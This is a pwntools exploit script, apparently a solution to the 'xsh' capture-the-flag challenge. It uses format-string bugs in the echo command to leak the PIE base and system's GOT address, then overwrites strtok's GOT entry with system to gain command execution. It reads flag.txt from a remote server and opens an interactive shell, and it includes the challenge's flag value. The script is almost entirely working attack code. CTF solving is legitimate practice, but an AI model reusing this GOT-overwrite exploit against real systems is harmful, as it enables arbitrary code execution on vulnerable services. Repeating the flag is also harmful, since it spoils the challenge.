from pwn import *

context.log_level = "DEBUG"

e = ELF("xsh")

if __debug__:
    p = process("./xsh")
else:
    p = remote("35.192.206.226", 5555)

p.recvuntil("$ ")
p.sendline("ls")

# pie leak
p.recvuntil("$ ")
payload = "echo %1$x"
p.sendline(payload)
PIE = int(p.recvline().strip(), 16) - 0x23AE
strtok_plt = PIE + 0x4034
system_plt = PIE + 0x4020
puts_plt = PIE + 0x401C
log.success("PIE = 0x{:x}".format(PIE))

# got leak
p.recvuntil("$ ")
payload = "echo "
payload += "%26$s  "
payload += p32(system_plt)
p.sendline(payload)
system_got = u32(p.recvline()[:4])
log.success("System got: 0x{:x}".format(system_got))

# got overwrite
p.recvuntil("$ ")
payload = "echo{:s}".format(p32(strtok_plt))
payload += "%{:d}c%24$hn".format((system_got & 0xffff) - 4 + 1)
p.sendline(payload)
p.recvuntil("$ ")
payload = "echo{:s}".format(p32(strtok_plt + 2))
payload += "%{:d}c%24$hn".format(((system_got >> 16) & 0xffff) - 4 + 1)
p.sendline(payload)

if not __debug__:
    p.sendline("cat flag.txt")
    p.recvline()
    flag = p.recvline().split()[-1].strip()
    assert flag == "rooters{ep1c_xsh_esc4p3}ctf"
    log.success("flag = {:s}".format(flag))

p.interactive()
